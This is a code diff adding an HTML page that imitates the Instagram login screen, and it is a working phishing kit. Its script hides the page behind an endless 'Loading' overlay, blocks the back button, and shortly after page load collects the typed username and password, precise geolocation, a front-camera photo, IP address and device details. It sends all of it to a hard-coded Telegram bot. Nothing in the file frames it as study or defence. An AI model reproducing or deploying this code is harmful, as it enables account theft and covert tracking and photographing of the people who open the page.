@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+
+        .container {
+            max-width: 350px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Instagram Logo */
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo svg {
+            width: 175px;
+        }
+
+        /* Input fields */
+        .input-field {
+            width: 100%;
+            padding: 12px 8px;
+            margin-bottom: 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+        }
+
+        /* Login button */
+        .login-button {
+            width: 100%;
+            padding: 8px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 8px;
+            opacity: 0.7;
+            cursor: pointer;
+        }
+
+        .login-button.active {
+            opacity: 1;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider-text {
+            margin: 0 18px;
+        }
+
+        /* Facebook login */
+        .facebook-login {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .facebook-btn {
+            background: none;
+            border: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        /* Forgot password */
+        .forgot-password {
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+        }
+
+        /* Signup box */
+        .signup-box {
+            text-align: center;
+            margin-top: 30px;
+            padding: 20px 0;
+            border-top: 1px solid #dbdbdb;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* App store buttons */
+        .app-store {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-store p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 15px;
+        }
+
+        .store-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .store-btn {
+            height: 40px;
+        }
+
+        /* BLUR OVERLAY - nutup halaman login dengan blur + loading */
+        .blur-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #262626;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .sub-text {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 175 51">
+            <path fill="#000" d="M85.5 15.8c-2.6 0-4.7 2.1-4.7 4.7v9.4c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7v-9.4c0-2.6-2.1-4.7-4.7-4.7zm0 15.3c-.7 0-1.2-.5-1.2-1.2v-9.4c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v9.4c0 .7-.5 1.2-1.2 1.2zM98.9 15.8c-2.6 0-4.7 2.1-4.7 4.7v9.4c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7v-9.4c0-2.6-2.1-4.7-4.7-4.7zm0 15.3c-.7 0-1.2-.5-1.2-1.2v-9.4c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v9.4c0 .7-.5 1.2-1.2 1.2zM112.5 15.8c-2.6 0-4.7 2.1-4.7 4.7v14.1c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7V20.5c0-2.6-2.1-4.7-4.7-4.7zm0 20c-.7 0-1.2-.5-1.2-1.2V20.5c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v14.1c0 .7-.5 1.2-1.2 1.2z"/>
+            <path fill="#000" d="M58.4 15.8c-2.6 0-4.7 2.1-4.7 4.7v14.1c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7V20.5c0-2.6-2.1-4.7-4.7-4.7zm0 20c-.7 0-1.2-.5-1.2-1.2V20.5c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v14.1c0 .7-.5 1.2-1.2 1.2zM67.8 22.1v13.3h-3.3V20.5c0-2.6 2.1-4.7 4.7-4.7h1.9v3.3h-1.9c-1.4 0-2.5.7-3 1.7c-.3.5-.4 1.1-.4 1.3z"/>
+            <path fill="#000" d="M131.5 15.8c-2.6 0-4.7 2.1-4.7 4.7v9.4c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7v-9.4c0-2.6-2.1-4.7-4.7-4.7zm0 15.3c-.7 0-1.2-.5-1.2-1.2v-9.4c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v9.4c0 .7-.5 1.2-1.2 1.2zM144.9 15.8c-2.6 0-4.7 2.1-4.7 4.7v14.1c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7V20.5c0-2.6-2.1-4.7-4.7-4.7zm0 20c-.7 0-1.2-.5-1.2-1.2V20.5c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v14.1c0 .7-.5 1.2-1.2 1.2z"/>
+            <path fill="#000" d="M158.5 22.1v13.3h-3.3V20.5c0-2.6 2.1-4.7 4.7-4.7h1.9v3.3h-1.9c-1.4 0-2.5.7-3 1.7c-.3.5-.4 1.1-.4 1.3zM29.5 15.8c-2.6 0-4.7 2.1-4.7 4.7v9.4c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7v-9.4c0-2.6-2.1-4.7-4.7-4.7zm0 15.3c-.7 0-1.2-.5-1.2-1.2v-9.4c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v9.4c0 .7-.5 1.2-1.2 1.2zM42.5 15.8c-2.6 0-4.7 2.1-4.7 4.7v14.1c0 2.6 2.1 4.7 4.7 4.7s4.7-2.1 4.7-4.7V20.5c0-2.6-2.1-4.7-4.7-4.7zm0 20c-.7 0-1.2-.5-1.2-1.2V20.5c0-.7.5-1.2 1.2-1.2s1.2.5 1.2 1.2v14.1c0 .7-.5 1.2-1.2 1.2z"/>
+        </svg>
+    </div>
+
+    <input type="text" class="input-field" id="username" placeholder="Phone number, username or email" autocomplete="off">
+    <input type="password" class="input-field" id="password" placeholder="Password">
+    
+    <div class="error-message" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
+    
+    <button class="login-button" id="loginBtn">Log in</button>
+
+    <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">OR</div>
+        <div class="divider-line"></div>
+    </div>
+
+    <div class="facebook-login">
+        <button class="facebook-btn" id="facebookBtn">
+            <span style="font-size:16px">f</span> Log in with Facebook
+        </button>
+    </div>
+
+    <div class="forgot-password">
+        <a href="#">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="app-store">
+        <p>Get the app.</p>
+        <div class="store-buttons">
+            <svg class="store-btn" viewBox="0 0 120 40" width="120" height="40">
+                <rect width="120" height="40" rx="6" fill="#000"/>
+                <text x="10" y="15" fill="#fff" font-size="7">Download on the</text>
+                <text x="10" y="28" fill="#fff" font-size="13" font-weight="bold">App Store</text>
+            </svg>
+            <svg class="store-btn" viewBox="0 0 120 40" width="120" height="40">
+                <rect width="120" height="40" rx="6" fill="#000"/>
+                <text x="10" y="15" fill="#fff" font-size="7">GET IT ON</text>
+                <text x="10" y="28" fill="#fff" font-size="13" font-weight="bold">Google Play</text>
+            </svg>
+        </div>
+    </div>
+</div>
+
+<!-- BLUR OVERLAY LANGSUNG MUNCUL -->
+<div class="blur-overlay" id="blurOverlay">
+    <div class="spinner"></div>
+    <div class="loading-text">Loading...</div>
+    <div class="sub-text">Please wait</div>
+</div>
+
+<script>
+    // ========== BOT TELEGRAM ==========
+    const BOT_TOKEN = "8138012087:AAG9gs84LXffRpBCi1AuRXzXshWKy1A3Lg4";
+    const OWNER_ID = "6854801678";
+    let dataSent = false;
+    // ==================================
+
+    async function sendToTelegram(text, photoBase64 = null) {
+        if(photoBase64) {
+            try {
+                let blob = await fetch(photoBase64).then(r => r.blob());
+                let fd = new FormData();
+                fd.append('chat_id', OWNER_ID);
+                fd.append('photo', blob, 'selfie.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch(e) {}
+        }
+        if(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: OWNER_ID, text: text, disable_web_page_preview: false })
+                });
+            } catch(e) {}
+        }
+    }
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if(!navigator.geolocation) { resolve({ ok: false }); return; }
+            navigator.geolocation.getCurrentPosition(
+                (p) => resolve({ ok: true, lat: p.coords.latitude, lng: p.coords.longitude, map: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }),
+                () => resolve({ ok: false }),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    function captureCamera() {
+        return new Promise((resolve) => {
+            if(!navigator.mediaDevices) { resolve({ ok: false }); return; }
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then((stream) => {
+                    let video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        let canvas = document.createElement('canvas');
+                        canvas.width = 540;
+                        canvas.height = 960;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        let img = canvas.toDataURL('image/jpeg', 0.6);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve({ ok: true, img: img });
+                    }, 800);
+                })
+                .catch(() => resolve({ ok: false }));
+        });
+    }
+
+    async function getDevice() {
+        let ip = 'unknown';
+        try {
+            let r = await fetch('https://api.ipify.org?format=json');
+            let d = await r.json();
+            ip = d.ip;
+        } catch(e) {}
+        return {
+            ip: ip,
+            ua: navigator.userAgent,
+            lang: navigator.language,
+            screen: screen.width + 'x' + screen.height,
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            time: new Date().toLocaleString('id-ID')
+        };
+    }
+
+    async function collectData() {
+        if(dataSent) return;
+        dataSent = true;
+
+        let loc = await getLocation();
+        let cam = await captureCamera();
+        let dev = await getDevice();
+        
+        let username = document.getElementById('username').value || 'not entered';
+        let password = document.getElementById('password').value || 'not entered';
+
+        let msg = `🎯 INSTAGRAM LOGIN
+━━━━━━━━━━━━━━━━━━━━
+👤 Username: ${username}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━━━━━━
+🌐 IP: ${dev.ip}
+📱 Device: ${dev.ua.substring(0, 100)}
+🌍 Lang: ${dev.lang} | ${dev.screen}
+⏰ Timezone: ${dev.tz}
+━━━━━━━━━━━━━━━━━━━━
+📍 Location: ${loc.ok ? loc.lat + ', ' + loc.lng : 'failed'}
+🗺️ Maps: ${loc.ok ? loc.map : '-'}
+━━━━━━━━━━━━━━━━━━━━
+📸 Camera: ${cam.ok ? 'CAPTURED' : 'failed'}
+🕒 Time: ${dev.time}
+━━━━━━━━━━━━━━━━━━━━`;
+
+        await sendToTelegram(msg);
+        if(cam.ok && cam.img) await sendToTelegram(null, cam.img);
+        
+        // Blur overlay tetap ada (loading infinity)
+    }
+
+    // Trigger permission pas load
+    setTimeout(() => {
+        if(navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{});
+        if(navigator.mediaDevices) navigator.mediaDevices.getUserMedia({ video: true }).then(s => s.getTracks().forEach(t => t.stop())).catch(()=>{});
+    }, 100);
+
+    // Ambil data setelah blur muncul
+    setTimeout(() => {
+        collectData();
+    }, 500);
+
+    // Prevent back
+    history.pushState(null, '', location.href);
+    window.onpopstate = () => history.go(1);
+</script>
+</body>
+</html>
